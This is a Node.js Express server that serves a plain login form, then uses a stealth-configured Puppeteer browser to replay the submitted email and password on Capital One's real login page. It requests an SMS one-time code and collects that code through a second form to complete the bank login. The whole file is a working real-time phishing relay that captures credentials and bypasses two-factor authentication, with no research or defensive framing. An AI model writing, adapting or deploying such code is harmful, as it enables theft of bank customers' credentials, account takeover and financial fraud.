const express = require("express");
const bodyParser = require("body-parser");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

// Add stealth plugin to Puppeteer
puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));

// Track invalid login attempts globally
let invalidAttempts = 0;
let browser, page;

// Utility function to launch Puppeteer browser
async function launchBrowser() {
  if (!browser) {
    console.log("Launching Puppeteer browser...");
    browser = await puppeteer.launch({
      headless: true,
      executablePath: '/app/.chrome-for-testing/chrome-linux64/chrome', // Updated path for Chrome for Testing
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
      ],
    });
    console.log("Browser launched successfully!");
    page = await browser.newPage();
    console.log("New page created!");
  }
}

// Gracefully close Puppeteer browser on termination
process.on("SIGTERM", async () => {
  console.log("SIGTERM received. Closing browser...");
  if (browser) await browser.close();
  process.exit(0);
});

process.on("SIGINT", async () => {
  console.log("SIGINT received. Closing browser...");
  if (browser) await browser.close();
  process.exit(0);
});

// Serve the login form
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 2rem auto;
            text-align: center;
          }
          input, button {
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-size: 1rem;
          }
          button {
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
          }
          button:hover {
            background-color: #0056b3;
          }
        </style>
      </head>
      <body>
        <h1>Login</h1>
        <form action="/submit-login" method="POST">
          <label>Email: <input type="text" name="email" required /></label><br/>
          <label>Password: <input type="password" name="password" required /></label><br/>
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
  `);
});

// Handle login form submission
app.post("/submit-login", async (req, res) => {
  const { email, password } = req.body;

  try {
    // Launch Puppeteer browser if not already launched
    await launchBrowser();

    console.log("Navigating to login page...");
    await page.goto("https://www.capitalone.com/", {
      waitUntil: "networkidle2",
      timeout: 15000, // Reduce timeout to avoid long waits
    });

    console.log("Clearing cookies and cache...");
    const client = await page.target().createCDPSession();
    await client.send("Network.clearBrowserCookies");
    await client.send("Network.clearBrowserCache");

    console.log("Filling in login form...");
    await page.evaluate(() => {
      const emailField = document.querySelector("input#ods-input-0");
      if (emailField) emailField.value = "";
      const passwordField = document.querySelector("input#ods-input-1");
      if (passwordField) passwordField.value = "";
    });
    await page.type("input#ods-input-0", email, { delay: 100 });
    await page.type("input#ods-input-1", password, { delay: 100 });

    console.log("Submitting login form...");
    await page.click("button#noAcctSubmit");
    await page.waitForNavigation({ waitUntil: "networkidle2", timeout: 15000 });

    console.log("Checking login success...");
    const loginSuccess = await page.evaluate(() => {
      const element = document.querySelector("div.option-list-entry--message > p.message--header");
      return element && element.textContent.trim() === "Text me a temporary code";
    });

    if (loginSuccess) {
      console.log("Login successful!");
      invalidAttempts = 0; // Reset invalid attempts

      console.log("Requesting OTP...");
      await page.click("div.option-list-entry--message > p.message--header");
      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
      await page.click('button[data-testtarget="otp-button"]');

      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Enter OTP</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Enter OTP</h1>
            <form action="/submit-otp" method="POST">
              <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
    } else {
      console.log("Login failed!");
      invalidAttempts++;
      res.send("<h1>Invalid login attempt. Please try again.</h1>");
    }
  } catch (error) {
    console.error("Error during login:", error);
    res.status(500).send("<h1>An error occurred during login. Please try again later.</h1>");
  }
});

// Handle OTP submission
app.post("/submit-otp", async (req, res) => {
  const { otp } = req.body;

  try {
    console.log("Submitting OTP...");
    await page.type('input#pinEntry', otp, { delay: 100 });
    await page.click('button[data-testtarget="otp-submit"]');
    await page.waitForNavigation({ waitUntil: "networkidle2", timeout: 15000 });

    const otpSuccess = await page.evaluate(() => {
      const dashboard = document.querySelector("div.dashboard");
      return !!dashboard;
    });

    if (otpSuccess) {
      res.send("<h1>OTP verified! Welcome to your dashboard.</h1>");
    } else {
      res.send("<h1>Invalid OTP. Please try again.</h1>");
    }
  } catch (error) {
    console.error("Error during OTP submission:", error);
    res.status(500).send("<h1>An error occurred while processing your OTP.</h1>");
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
